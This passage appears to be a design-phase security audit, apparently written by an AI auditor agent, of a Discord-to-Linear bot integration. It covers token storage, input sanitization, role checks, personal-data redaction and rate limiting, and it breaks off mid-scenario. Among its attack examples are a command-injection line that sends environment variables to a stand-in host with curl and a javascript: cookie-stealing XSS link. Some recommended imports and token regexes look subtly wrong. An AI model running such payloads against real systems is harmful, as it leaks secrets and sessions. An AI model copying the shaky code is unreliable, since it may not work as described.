# Security & Quality Audit Report: Agentic-Base Organizational Integration

**Auditor:** Paranoid Cypherpunk Auditor Agent
**Date:** 2025-12-07
**Scope:** Discord, Linear, GitHub, Vercel Integration
**Status:** Pre-Implementation Design Review

---

## Executive Summary

### Overall Risk Level: **HIGH** ⚠️

This audit reviews the organizational integration architecture for agentic-base connecting Discord, Linear, GitHub, and Vercel. **CRITICAL FINDING: The implementation code does not exist yet** - only comprehensive documentation has been created. This represents a significant gap between design and reality.

### Key Findings

**CRITICAL ISSUES (Block Production Deployment):**
1. ❌ **No Implementation** - Zero code exists, only documentation
2. ❌ **Discord Bot Token Security** - Hardcoded token path with insufficient protection
3. ❌ **Input Validation Missing** - No sanitization for user-generated Discord content
4. ❌ **Authentication/Authorization Gaps** - No role-based access control design
5. ❌ **Secrets Management** - Relies on gitignored .env.local without encryption

**HIGH PRIORITY (Fix Before Production):**
6. ⚠️ **PII Exposure Risk** - Discord messages may contain sensitive data
7. ⚠️ **API Rate Limiting** - No circuit breakers or backoff strategies
8. ⚠️ **Error Information Disclosure** - Error messages may leak implementation details
9. ⚠️ **No Webhook Signature Verification** - Linear/Vercel webhooks not authenticated
10. ⚠️ **Insufficient Logging Security** - Logs may contain secrets or PII

### Risk Score: 6.5/10 (Design Phase)

**Recommendation:** DO NOT DEPLOY TO PRODUCTION until all critical issues are resolved and implementation exists.

---

## 1. CRITICAL SECURITY ISSUES

### 🔴 CRITICAL #1: Implementation Does Not Exist

**Severity:** CRITICAL
**Location:** `integration/src/` directory
**Impact:** Complete system failure - cannot deploy non-existent code

**Finding:**
The audit reveals that **NO IMPLEMENTATION CODE EXISTS**. The `integration/` directory contains only a README.md file describing the intended architecture. The documentation in `docs/tool-setup.md` provides detailed implementation instructions with code snippets, but these are templates, not actual working code.

**Evidence:**
```bash
$ ls -la integration/
total 20
drwx------ 2 merlin merlin  4096 Dec  7 21:20 .
drwxrwxr-x 6 merlin merlin  4096 Dec  7 21:20 ..
-rw------- 1 merlin merlin 10910 Dec  7 21:20 README.md
```

No `src/`, `config/`, or `secrets/` directories exist.

**Risk:**
- Cannot assess implementation security without code
- Documentation may not reflect actual security posture when implemented
- Setup instructions may have security vulnerabilities when executed

**Recommendation:**
1. **DO NOT** claim system is "ready for deployment"
2. Implement code following security best practices
3. Re-audit implementation after code exists
4. Verify all security controls from documentation are actually implemented

---

### 🔴 CRITICAL #2: Discord Bot Token Hardcoded Path

**Severity:** CRITICAL
**Location:** `docs/tool-setup.md:484`, proposed `integration/src/bot.ts:484`
**Impact:** Token compromise, unauthorized bot access, privilege escalation

**Finding:**
The design specifies hardcoded path for loading secrets:

```typescript
dotenv.config({ path: path.join(__dirname, '../secrets/.env.local') });
```

**Vulnerabilities:**
1. **Relative Path Dependency** - Breaks if working directory changes
2. **No Fallback** - Silent failure if file missing
3. **Insufficient Protection** - File permissions not enforced (mode 600 recommended)
4. **No Validation** - Token validity not verified at startup
5. **No Rotation Strategy** - Documentation mentions 90-day rotation but no automation

**Attack Scenarios:**
- **Scenario 1:** Attacker gains read access to filesystem → reads .env.local → full bot control
- **Scenario 2:** Path traversal via process working directory manipulation → wrong file loaded
- **Scenario 3:** Token leaked in logs (if dotenv errors printed) → bot compromise

**Exploitation Difficulty:** Medium (requires filesystem access or process control)
**Impact:** CRITICAL - Full bot compromise, unauthorized Discord/Linear API access

**Recommendation:**
```typescript
// SECURE IMPLEMENTATION
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';

const ENV_FILE = path.resolve(__dirname, '../secrets/.env.local');

// 1. Verify file permissions (Unix-like systems)
try {
  const stats = fs.statSync(ENV_FILE);
  const mode = stats.mode & 0o777;
  if (mode !== 0o600) {
    console.error(`SECURITY: ${ENV_FILE} has insecure permissions ${mode.toString(8)}`);
    console.error(`Run: chmod 600 ${ENV_FILE}`);
    process.exit(1);
  }
} catch (error) {
  console.error(`FATAL: Cannot access ${ENV_FILE}:`, error.message);
  process.exit(1);
}

// 2. Load environment variables
const result = dotenv.config({ path: ENV_FILE });
if (result.error) {
  console.error('FATAL: Cannot load environment variables:', result.error);
  process.exit(1);
}

// 3. Validate required tokens exist and have correct format
const REQUIRED_VARS = {
  DISCORD_BOT_TOKEN: /^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$/, // Discord token format
  LINEAR_API_TOKEN: /^lin_api_[a-f0-9]{40}$/,             // Linear token format
  DISCORD_DIGEST_CHANNEL_ID: /^\d{17,19}$/,               // Snowflake ID
  LINEAR_TEAM_ID: /^[a-f0-9-]{36}$/,                      // UUID
};

for (const [varName, pattern] of Object.entries(REQUIRED_VARS)) {
  const value = process.env[varName];
  if (!value) {
    console.error(`FATAL: Missing required environment variable: ${varName}`);
    process.exit(1);
  }
  if (!pattern.test(value)) {
    console.error(`FATAL: Invalid format for ${varName}`);
    process.exit(1);
  }
}

// 4. Test Discord API connectivity at startup
async function validateDiscordToken() {
  try {
    const response = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}` }
    });
    if (!response.ok) {
      throw new Error(`Discord API returned ${response.status}`);
    }
  } catch (error) {
    console.error('FATAL: Discord token validation failed:', error.message);
    process.exit(1);
  }
}

await validateDiscordToken();
```

**Additional Controls:**
- Store tokens in proper secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)
- Implement automated token rotation with monitoring
- Use least-privilege tokens (separate tokens for read vs. write operations)
- Add token expiry monitoring and alerting

---

### 🔴 CRITICAL #3: Input Validation Missing

**Severity:** CRITICAL
**Location:** `docs/tool-setup.md:569-621` (feedbackCapture.ts)
**Impact:** XSS, injection attacks, data corruption, Linear API abuse

**Finding:**
The proposed feedback capture handler extracts message content without ANY sanitization:

```typescript
// VULNERABLE CODE
const context = {
  content: message.content,  // ❌ NO SANITIZATION
  author: message.author.tag, // ❌ NO SANITIZATION
  // ...
};

const description = `
## Original Feedback
**From:** ${context.author} in #${context.channelName}  // ❌ NO ESCAPING
> ${context.content}  // ❌ RAW USER INPUT
`;
```

**Vulnerabilities:**

**1. Markdown Injection in Linear Issues**
```
Attacker posts in Discord:
"**THIS IS FINE** [Click Here](javascript:alert(document.cookie))"

Result: Linear issue contains malicious link
When clicked in Linear app: XSS executed
```

**2. Denial of Service via Large Messages**
```
Attacker posts 2000 character message with special chars
Bot creates Linear issue
Linear API hits rate limit
Legitimate issues fail to create
```

**3. Command Injection via URLs**
```
Attacker posts: "Check this out! $(curl evil.com/steal?data=$(env))"
If bot processes URLs for metadata: Command executed
```

**4. User Mention Injection**
```
Attacker posts: "@everyone @here URGENT BUG"
Bot copies to Linear
Linear notifications spam entire team
```

**Attack Scenarios:**
- **Scenario 1:** Attacker posts malicious markdown → Linear issue contains XSS → victim clicks → session stolen
- **Scenario 2:** Attacker posts massive Unicode text → Bot crashes → DoS
- **Scenario 3:** Attacker posts `;DROP TABLE issues--` → If bot uses SQL → SQLi (unlikely but check Linear SDK)

**Exploitation Difficulty:** Low (any Discord member can attempt)
**Impact:** CRITICAL - XSS, DoS, spam, potential RCE

**Recommendation:**

```typescript
import { sanitize } from 'dompurify';
import validator from 'validator';

// SECURE IMPLEMENTATION
async function handleReaction(reaction, user, client) {
  try {
    const message = reaction.message;

    // 1. RATE LIMITING - Prevent spam
    const rateLimitKey = `feedback:${user.id}`;
    const recentFeedback = await redis.get(rateLimitKey);
    if (recentFeedback && parseInt(recentFeedback) >= 5) {
      await message.reply('⚠️ Rate limit: Maximum 5 feedback captures per hour.');
      logger.warn(`Rate limit hit for user ${user.id}`);
      return;
    }
    await redis.setex(rateLimitKey, 3600, (parseInt(recentFeedback) || 0) + 1);

    // 2. INPUT VALIDATION
    if (message.content.length > 2000) {
      await message.reply('❌ Feedback too long (max 2000 characters)');
      return;
    }

    if (message.content.length < 10) {
      await message.reply('❌ Feedback too short (min 10 characters)');
      return;
    }

    // 3. SANITIZATION
    const sanitizedContent = sanitize(message.content, {
      ALLOWED_TAGS: ['b', 'i', 'code', 'pre'], // Minimal markdown
      ALLOWED_ATTR: [],
      KEEP_CONTENT: true,
    });

    const sanitizedAuthor = validator.escape(message.author.tag);
    const sanitizedChannel = validator.escape(
      message.channel.isDMBased() ? 'DM' : message.channel.name
    );

    // 4. URL VALIDATION
    const urls = extractUrls(message.content);
    const validatedUrls = [];
    for (const url of urls) {
      if (!validator.isURL(url, { protocols: ['http', 'https'], require_protocol: true })) {
        logger.warn(`Skipping invalid URL: ${url}`);
        continue;
      }
      // Whitelist known domains
      try {
        const urlObj = new URL(url);
        const allowedDomains = ['vercel.app', 'github.com', 'linear.app'];
        if (!allowedDomains.some(d => urlObj.hostname.endsWith(d))) {
          logger.warn(`Skipping non-whitelisted URL: ${url}`);
          continue;
        }
        validatedUrls.push(validator.escape(url));
      } catch {
        logger.warn(`Skipping malformed URL: ${url}`);
      }
    }

    // 5. ATTACHMENT VALIDATION
    const validatedAttachments = message.attachments
      .filter(att => {
        const ext = att.url.split('.').pop().toLowerCase();
        const allowedExts = ['png', 'jpg', 'jpeg', 'gif', 'mp4', 'webm'];
        return allowedExts.includes(ext) && att.size < 10 * 1024 * 1024; // 10MB max
      })
      .map(att => validator.escape(att.url));

    // 6. CONSTRUCT SAFE CONTEXT
    const context = {
      content: sanitizedContent,
      author: sanitizedAuthor,
      authorId: message.author.id, // Discord ID is safe
      channelName: sanitizedChannel,
      messageUrl: validator.escape(message.url),
      timestamp: message.createdAt.toISOString(),
      attachments: validatedAttachments,
      urls: validatedUrls,
    };

    // 7. CREATE LINEAR ISSUE WITH SAFE DATA
    const issueResult = await createDraftLinearIssue(context);

    if (issueResult.success) {
      await message.reply(
        `✅ Feedback captured as draft Linear issue **${validator.escape(issueResult.issueIdentifier)}**`
      );
    } else {
      // Don't expose internal error details
      await message.reply('❌ Failed to capture feedback. Please try again later.');
      logger.error('Linear issue creation failed:', issueResult.error);
    }

  } catch (error) {
    logger.error('Error in handleReaction:', error);
    // Generic error message to user
    await reaction.message.reply('❌ An error occurred. Please contact an administrator.');
  }
}

// SAFE URL EXTRACTION
function extractUrls(text) {
  // Use strict URL regex, not greedy /(https?:\/\/[^\s]+)/g
  const urlRegex = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/g;
  return text.match(urlRegex) || [];
}
```

**Required Dependencies:**
```bash
npm install dompurify validator ioredis
npm install @types/dompurify @types/validator -D
```

---

### 🔴 CRITICAL #4: No Role-Based Access Control (RBAC)

**Severity:** CRITICAL
**Location:** Entire architecture
**Impact:** Privilege escalation, unauthorized actions, data tampering

**Finding:**
The architecture documentation mentions "developer only" commands but provides **ZERO implementation** for access control:

**From tool-setup.md:441:**
```yaml
my_tasks:
  enabled: true
  description: "Show all Linear tasks assigned to you"
  developer_only: true  # ❌ NOT ENFORCED ANYWHERE
```

**Missing Controls:**

1. **No Role Verification**
   - Bot doesn't check Discord roles before executing commands
   - Researcher could run `/implement THJ-123` (developer command)
   - Anyone could run `/feedback @researcher` (developer only)

2. **No Permission Enforcement for 📌 Reaction**
   - Documentation says "developer reacts with 📌" but doesn't enforce
   - ANY Discord user could trigger feedback capture
   - Spam attack: Malicious user reacts to all messages → DoS Linear API

3. **No Audit Trail for Privileged Actions**
   - Who created Linear issues? Unknown.
   - Who updated statuses? Unknown.
   - No attribution = no accountability

4. **No Protection for Configuration Changes**
   - user-preferences.json is world-readable
   - Bot can modify any user's notification preferences
   - No verification that user requesting change is actual user

**Attack Scenarios:**
- **Scenario 1:** Malicious researcher runs `/my-tasks` → sees all developer tasks → learns internal architecture
- **Scenario 2:** External user joins Discord → spams 📌 reactions → creates 1000 draft Linear issues → DoS
- **Scenario 3:** Attacker modifies user-preferences.json → disables notifications for all users → team misses critical alerts

**Exploitation Difficulty:** Low (requires Discord server access)
**Impact:** CRITICAL - Privilege escalation, DoS, information disclosure

**Recommendation:**

```typescript
// 1. DEFINE ROLES
enum UserRole {
  RESEARCHER = 'researcher',
  DEVELOPER = 'developer',
  ADMIN = 'admin',
}

interface RoleConfig {
  discordRoleId: string;
  permissions: string[];
}

// Load from config file
const ROLE_CONFIG: Record<UserRole, RoleConfig> = {
  [UserRole.RESEARCHER]: {
    discordRoleId: process.env.RESEARCHER_ROLE_ID!,
    permissions: ['show-sprint', 'preview', 'doc', 'task', 'my-notifications'],
  },
  [UserRole.DEVELOPER]: {
    discordRoleId: process.env.DEVELOPER_ROLE_ID!,
    permissions: [
      'show-sprint', 'preview', 'doc', 'task', 'my-notifications',
      'implement', 'review-sprint', 'my-tasks', 'implement-status', 'feedback',
      'feedback-capture', // 📌 reaction
    ],
  },
  [UserRole.ADMIN]: {
    discordRoleId: process.env.ADMIN_ROLE_ID!,
    permissions: ['*'], // All permissions
  },
};

// 2. PERMISSION CHECKER
async function getUserRoles(user: User, guild: Guild): Promise<UserRole[]> {
  try {
    const member = await guild.members.fetch(user.id);
    const roles: UserRole[] = [];

    for (const [role, config] of Object.entries(ROLE_CONFIG)) {
      if (member.roles.cache.has(config.discordRoleId)) {
        roles.push(role as UserRole);
      }
    }

    if (roles.length === 0) {
      logger.warn(`User ${user.id} has no recognized roles`);
    }

    return roles;
  } catch (error) {
    logger.error(`Error fetching roles for user ${user.id}:`, error);
    return [];
  }
}

async function hasPermission(
  user: User,
  guild: Guild,
  permission: string
): Promise<boolean> {
  const userRoles = await getUserRoles(user, guild);

  for (const role of userRoles) {
    const config = ROLE_CONFIG[role];
    if (config.permissions.includes('*') || config.permissions.includes(permission)) {
      return true;
    }
  }

  return false;
}

// 3. ENFORCE IN COMMAND HANDLER
async function handleCommand(message: Message, client: Client) {
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift()?.toLowerCase();

  if (!command) return;

  // Check permission BEFORE executing
  if (!message.guild) {
    await message.reply('❌ Commands must be used in a server channel.');
    return;
  }

  const hasAccess = await hasPermission(message.author, message.guild, command);
  if (!hasAccess) {
    await message.reply(`❌ You don't have permission to use \`/${command}\`.`);
    logger.warn(`Permission denied: ${message.author.tag} tried /${command}`);
    return;
  }

  // Audit log BEFORE executing
  logger.info(`Command executed: /${command} by ${message.author.tag} (${message.author.id})`);

  // Execute command...
}

// 4. ENFORCE IN FEEDBACK CAPTURE
async function handleReaction(reaction: MessageReaction, user: User, client: Client) {
  if (reaction.emoji.name !== '📌') return;

  const guild = reaction.message.guild;
  if (!guild) {
    logger.warn('Reaction in DM, ignoring');
    return;
  }

  // CHECK PERMISSION
  const hasAccess = await hasPermission(user, guild, 'feedback-capture');
  if (!hasAccess) {
    // Don't reply publicly, just log
    logger.warn(`Permission denied: ${user.tag} tried to capture feedback but lacks role`);
    return;
  }

  // Audit log
  logger.info(`Feedback captured by ${user.tag} (${user.id}) for message ${reaction.message.id}`);

  // Proceed with capture...
}

// 5. PROTECT USER PREFERENCES
async function updateUserPreferences(userId: string, requesterId: string, changes: any) {
  // User can only modify their own preferences, unless admin
  if (userId !== requesterId) {
    const requester = await client.users.fetch(requesterId);
    const guild = /* get guild */;
    const isAdmin = await hasPermission(requester, guild, '*');

    if (!isAdmin) {
      throw new Error('Permission denied: Cannot modify other users\' preferences');
    }
    logger.warn(`Admin ${requesterId} modified preferences for ${userId}`);
  }

  // Validate changes
  const allowedKeys = ['daily_digest', 'feedback_updates', 'vercel_previews', 'review_requests'];
  for (const key of Object.keys(changes)) {
    if (!allowedKeys.includes(key)) {
      throw new Error(`Invalid preference key: ${key}`);
    }
    if (typeof changes[key] !== 'boolean') {
      throw new Error(`Invalid preference value for ${key}: must be boolean`);
    }
  }

  // Apply changes with audit
  logger.info(`Preferences updated for ${userId}: ${JSON.stringify(changes)}`);
  // ... save to file or database
}
```

**Configuration Required:**
```env
# secrets/.env.local
RESEARCHER_ROLE_ID=123456789012345678
DEVELOPER_ROLE_ID=234567890123456789
ADMIN_ROLE_ID=345678901234567890
```

**Setup in Discord:**
1. Create roles: "Researcher", "Developer", "Admin"
2. Copy role IDs (Developer Mode → Right-click role → Copy ID)
3. Add to .env.local
4. Assign roles to team members

---

### 🔴 CRITICAL #5: Secrets Management Inadequate

**Severity:** CRITICAL
**Location:** `docs/tool-setup.md:209-240`, `.gitignore`
**Impact:** Token leakage, credential theft, account compromise

**Finding:**
The proposed secrets management relies solely on `.gitignore` and file permissions:

```bash
# From tool-setup.md
cat > secrets/.env.local << 'EOF'
DISCORD_BOT_TOKEN=your_discord_bot_token_here
LINEAR_API_TOKEN=your_linear_api_token_here
EOF

echo "secrets/" >> ../.gitignore
```

**Vulnerabilities:**

1. **No Encryption at Rest**
   - Tokens stored in plaintext
   - Any process with file read access can steal tokens
   - Backups contain plaintext tokens

2. **Weak .gitignore Protection**
   - `.gitignore` only prevents git commits
   - Doesn't prevent: `cat`, `cp`, `scp`, `rsync`, IDE file uploads, etc.
   - Developers might accidentally `git add -f secrets/.env.local`

3. **No Secret Rotation**
   - Documentation says "rotate every 90 days" but no enforcement
   - No expiry warnings
   - No automated rotation

4. **Token Sprawl**
   - Same token used for all operations (no least privilege)
   - Token has full permissions (read + write)
   - If compromised: Full account takeover

5. **No Secrets Scanning**
   - No pre-commit hooks to detect accidental commits
   - No CI/CD scanning for leaked secrets
   - No runtime monitoring for token theft

**Attack Scenarios:**
- **Scenario 1:** Developer commits secrets despite .gitignore → token in git history → public repo leak → bot takeover
- **Scenario 2:** Compromised server → attacker reads .env.local → steals all tokens → full access
- **Scenario 3:** Backup misconfiguration → backup file publicly accessible → secrets exposed
- **Scenario 4:** Developer shares screen during meeting → .env.local visible → tokens stolen

**Evidence of Risk:**
```bash
# Common mistakes that bypass .gitignore:
git add -f secrets/.env.local        # Force add
git add secrets/*                    # Wildcard may include .env.local
cp secrets/.env.local /tmp/          # Copy to unsafe location
cat secrets/.env.local > logs.txt    # Log tokens accidentally
```

**Exploitation Difficulty:** Medium (requires repository access or server access)
**Impact:** CRITICAL - Complete system compromise

**Recommendation:**

**Phase 1: Immediate Improvements (Low Cost)**

```bash
# 1. ENFORCE FILE PERMISSIONS
chmod 600 integration/secrets/.env.local
chmod 700 integration/secrets/

# Add to setup script:
cat > integration/scripts/verify-secrets.sh << 'EOF'
#!/bin/bash
ENV_FILE="secrets/.env.local"

if [ ! -f "$ENV_FILE" ]; then
  echo "ERROR: $ENV_FILE not found"
  exit 1
fi

# Check permissions
PERMS=$(stat -c %a "$ENV_FILE")
if [ "$PERMS" != "600" ]; then
  echo "ERROR: $ENV_FILE has insecure permissions: $PERMS"
  echo "Run: chmod 600 $ENV_FILE"
  exit 1
fi

# Check not in git
if git ls-files --error-unmatch "$ENV_FILE" 2>/dev/null; then
  echo "ERROR: $ENV_FILE is tracked by git!"
  echo "Run: git rm --cached $ENV_FILE"
  exit 1
fi

echo "✓ Secrets file security checks passed"
EOF

chmod +x integration/scripts/verify-secrets.sh

# Run in CI/CD:
npm run verify-secrets  # Add to package.json
```

**2. PRE-COMMIT HOOKS**

```bash
# Install git-secrets
# https://github.com/awslabs/git-secrets
brew install git-secrets  # macOS
apt-get install git-secrets  # Linux

# Configure
cd /path/to/agentic-base
git secrets --install
git secrets --register-aws  # Detect AWS keys
git secrets --add 'lin_api_[a-f0-9]{40}'  # Linear tokens
git secrets --add 'xoxb-[0-9]{11,12}-[0-9]{11,12}-[a-zA-Z0-9]{24}'  # Slack (future)
git secrets --add '[0-9]{17,19}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}'  # Discord bot tokens

# Test
echo "DISCORD_BOT_TOKEN=123456789.ABCDEF.XYZ" | git secrets --scan -
```

**3. ENVIRONMENT VARIABLE VALIDATION**

```typescript
// integration/src/utils/secrets.ts
import crypto from 'crypto';

interface SecretMetadata {
  name: string;
  value: string;
  hash: string;  // SHA-256 hash for comparison
  lastRotated: Date;
  expiresAt: Date;
}

export class SecretsManager {
  private secrets: Map<string, SecretMetadata> = new Map();
  private readonly ROTATION_DAYS = 90;

  load() {
    // Load secrets from .env.local
    const requiredVars = [
      'DISCORD_BOT_TOKEN',
      'LINEAR_API_TOKEN',
      'DISCORD_DIGEST_CHANNEL_ID',
      'LINEAR_TEAM_ID',
    ];

    for (const varName of requiredVars) {
      const value = process.env[varName];
      if (!value) {
        throw new Error(`Missing required secret: ${varName}`);
      }

      const hash = crypto.createHash('sha256').update(value).digest('hex');
      const lastRotated = new Date(); // Ideally load from metadata file
      const expiresAt = new Date(lastRotated.getTime() + this.ROTATION_DAYS * 24 * 60 * 60 * 1000);

      this.secrets.set(varName, {
        name: varName,
        value,
        hash,
        lastRotated,
        expiresAt,
      });

      // Warn if expiring soon
      const daysUntilExpiry = (expiresAt.getTime() - Date.now()) / (24 * 60 * 60 * 1000);
      if (daysUntilExpiry < 7) {
        console.warn(`⚠️  ${varName} expires in ${Math.floor(daysUntilExpiry)} days - please rotate`);
      }
    }

    // Never log actual secret values
    console.info('✓ Loaded secrets:', Array.from(this.secrets.keys()));
  }

  get(name: string): string {
    const secret = this.secrets.get(name);
    if (!secret) {
      throw new Error(`Secret not found: ${name}`);
    }

    // Check expiry
    if (new Date() > secret.expiresAt) {
      throw new Error(`Secret expired: ${name} (expired ${secret.expiresAt.toISOString()})`);
    }

    return secret.value;
  }

  // Verify secret hasn't been tampered with
  verify(name: string): boolean {
    const secret = this.secrets.get(name);
    if (!secret) return false;

    const currentHash = crypto.createHash('sha256').update(secret.value).digest('hex');
    return currentHash === secret.hash;
  }
}

// Usage in bot.ts:
import { SecretsManager } from './utils/secrets';

const secrets = new SecretsManager();
secrets.load();

const client = new Client({
  // Use getter instead of direct process.env
  intents: [...],
});

client.login(secrets.get('DISCORD_BOT_TOKEN'));
```

**Phase 2: Production-Grade Solution**

For production deployment, migrate to proper secrets management:

**Option 1: HashiCorp Vault (Self-Hosted)**

```bash
# 1. Install Vault
# https://www.vaultproject.io/downloads

# 2. Start Vault dev server (for testing)
vault server -dev

# 3. Store secrets
vault kv put secret/agentic-base/discord \
  token="MTIzNDU2Nzg5MC5BQkNERUY.xyz"

vault kv put secret/agentic-base/linear \
  token="lin_api_1234567890abcdef"

# 4. Retrieve in code
import vault from 'node-vault';

const client = vault({
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN, // From service account
});

const discordToken = await client.read('secret/data/agentic-base/discord');
const DISCORD_BOT_TOKEN = discordToken.data.data.token;
```

**Option 2: Cloud Secrets Manager**

AWS Secrets Manager:
```bash
# Store secret
aws secretsmanager create-secret \
  --name agentic-base/discord-token \
  --secret-string '{"token":"MTIzNDU2..."}'

# Retrieve in code
import { SecretsManagerClient, GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";

const client = new SecretsManagerClient({ region: "us-east-1" });
const response = await client.send(
  new GetSecretValueCommand({ SecretId: "agentic-base/discord-token" })
);
const { token } = JSON.parse(response.SecretString);
```

**Option 3: Encrypted .env (Interim Solution)**

```bash
# Use sops (Secrets OPerationS)
# https://github.com/mozilla/sops

# 1. Install sops
brew install sops

# 2. Generate encryption key (GPG or age)
age-keygen -o keys.txt
# Public key: age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p

# 3. Encrypt .env.local
sops --encrypt \
  --age age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p \
  secrets/.env.local > secrets/.env.local.enc

# 4. Decrypt at runtime
sops --decrypt secrets/.env.local.enc > secrets/.env.local
node dist/bot.js

# 5. Add to .gitignore
echo "secrets/.env.local" >> .gitignore
echo "!secrets/.env.local.enc" >> .gitignore  # Commit encrypted version
```

**Priority Actions:**
1. ✅ Add file permission checks to setup script
2. ✅ Install git-secrets or similar pre-commit hook
3. ✅ Add secret rotation warnings to bot startup
4. ⏳ Evaluate secrets manager for production (Vault, AWS, Azure)
5. ⏳ Implement automated secret rotation

---

## 2. HIGH PRIORITY SECURITY ISSUES

### ⚠️ HIGH #6: PII Exposure Risk

**Severity:** HIGH
**Location:** Discord feedback capture, logs
**Impact:** Privacy violation, GDPR/CCPA non-compliance, reputation damage

**Finding:**
Discord messages captured via 📌 reaction may contain personally identifiable information (PII):

- User emails mentioned in feedback
- IP addresses from debugging messages
- Names, phone numbers, addresses in test data
- OAuth tokens accidentally pasted
- Credit card numbers in payment testing discussions
- Medical/health information (if building healthcare app)

**Vulnerabilities:**

1. **No PII Detection** - Bot blindly copies all message content to Linear
2. **No Redaction** - PII stored permanently in Linear issues
3. **No Access Controls** - All team members see all feedback (may include PII)
4. **Logs Contain PII** - `discord-bot.log` logs message content
5. **No Data Retention Policy** - PII persists indefinitely

**Example Scenario:**
```
Researcher posts in Discord:
"Login failed for test user john.doe@example.com password: TestPass123"

Developer reacts with 📌
→ Linear issue created with cleartext credentials
→ All team members can see
→ Credentials compromised
```

**Recommendation:**

```typescript
// 1. PII DETECTION
import { Regex } from '@phc/format';

const PII_PATTERNS = {
  email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
  phone: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g,
  ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
  creditCard: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/g,
  ipAddress: /\b(?:\d{1,3}\.){3}\d{1,3}\b/g,
  jwt: /\beyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*\b/g,
};

function detectPII(text: string): { hasPII: boolean; types: string[] } {
  const detected: string[] = [];

  for (const [type, pattern] of Object.entries(PII_PATTERNS)) {
    if (pattern.test(text)) {
      detected.push(type);
    }
  }

  return {
    hasPII: detected.length > 0,
    types: detected,
  };
}

function redactPII(text: string): string {
  let redacted = text;

  redacted = redacted.replace(PII_PATTERNS.email, '[EMAIL REDACTED]');
  redacted = redacted.replace(PII_PATTERNS.phone, '[PHONE REDACTED]');
  redacted = redacted.replace(PII_PATTERNS.ssn, '[SSN REDACTED]');
  redacted = redacted.replace(PII_PATTERNS.creditCard, '[CARD REDACTED]');
  redacted = redacted.replace(PII_PATTERNS.ipAddress, '[IP REDACTED]');
  redacted = redacted.replace(PII_PATTERNS.jwt, '[TOKEN REDACTED]');

  return redacted;
}

// 2. USE IN FEEDBACK CAPTURE
async function handleReaction(reaction, user, client) {
  const message = reaction.message;
  const content = message.content;

  // Detect PII
  const piiCheck = detectPII(content);

  if (piiCheck.hasPII) {
    logger.warn(`PII detected in message ${message.id}: ${piiCheck.types.join(', ')}`);

    // Option A: Block capture entirely
    await message.reply(
      '⚠️ This message appears to contain sensitive information (email, phone, etc.). ' +
      'Please remove sensitive data and try again, or create a Linear issue manually.'
    );
    return;

    // Option B: Auto-redact (less safe - may miss some PII)
    // const redactedContent = redactPII(content);
    // const context = { content: redactedContent, ... };
  }

  // Proceed with capture...
}

// 3. LOGGING WITHOUT PII
class SafeLogger {
  private shouldRedact = true;

  info(message: string, ...args: any[]) {
    const safeMessage = this.shouldRedact ? redactPII(message) : message;
    const safeArgs = this.shouldRedact ? args.map(a =>
      typeof a === 'string' ? redactPII(a) : a
    ) : args;

    console.log(`[INFO] ${safeMessage}`, ...safeArgs);
    // Write to file...
  }

  // Don't log user message content at all
  logCommand(user: string, command: string) {
    console.log(`[AUDIT] User ${user} executed /${command}`);
    // Note: No message content logged
  }
}

// 4. DATA RETENTION POLICY
async function cleanupOldFeedback() {
  // Delete Linear issues older than retention period
  const RETENTION_DAYS = 365; // 1 year
  const cutoffDate = new Date();
  cutoffDate.setDate(cutoffDate.getDate() - RETENTION_DAYS);

  const oldIssues = await linearClient.issues({
    filter: {
      labels: { some: { name: { eq: 'researcher-feedback' } } },
      createdAt: { lt: cutoffDate.toISOString() },
    },
  });

  for (const issue of oldIssues.nodes) {
    logger.info(`Archiving old feedback issue: ${issue.identifier}`);
    // Archive or delete based on policy
    await linearClient.deleteIssue(issue.id);
  }
}

// Run monthly
cron.schedule('0 0 1 * *', cleanupOldFeedback);
```

**Compliance Requirements:**

**GDPR (EU):**
- Right to erasure (delete user data on request)
- Data minimization (collect only necessary data)
- Purpose limitation (use data only for stated purpose)
- Storage limitation (delete after retention period)

**CCPA (California):**
- Right to know (disclose what PII is collected)
- Right to delete
- Right to opt-out

**Implementation:**
```typescript
// Handle data subject requests
async function handleDataDeletionRequest(userId: string) {
  // 1. Delete from user preferences
  delete userPreferences.users[userId];

  // 2. Delete from Linear (all issues created by user)
  const userIssues = await linearClient.issues({
    filter: { creator: { id: { eq: userId } } },
  });
  for (const issue of userIssues.nodes) {
    await linearClient.deleteIssue(issue.id);
  }

  // 3. Redact from logs
  // (Complex - consider log retention policy instead)

  logger.info(`Data deletion completed for user ${userId}`);
}
```

---

### ⚠️ HIGH #7: No API Rate Limiting / Circuit Breakers

**Severity:** HIGH
**Location:** Linear API calls throughout
**Impact:** Service disruption, API quota exhaustion, cascading failures

**Finding:**
The architecture makes numerous Linear API calls with no protection:

- Feedback capture: 1 API call per 📌 reaction
- Daily digest: N API calls (one per task status query)
- Implementation: M API calls per `/implement` command
- Status updates: 1 API call per status change

**Linear API Limits:**
- 2000 requests/hour per token
- No burst allowance documented
- Rate limit errors return HTTP 429

**Attack Scenarios:**

**Scenario 1: Accidental DoS**
```
Researcher accidentally clicks 📌 on 100 messages
→ 100 Linear API calls instantly
→ Rate limit hit
→ Legitimate operations fail for next hour
→ Sprint blocked
```

**Scenario 2: Malicious Spam**
```
Attacker gains Discord access
→ Creates 📌 reactions on every message
→ Linear API quota exhausted
→ Bot unusable for entire team
→ DoS achieved
```

**Scenario 3: Cascading Failure**
```
Linear API has outage
→ Bot keeps retrying failed API calls
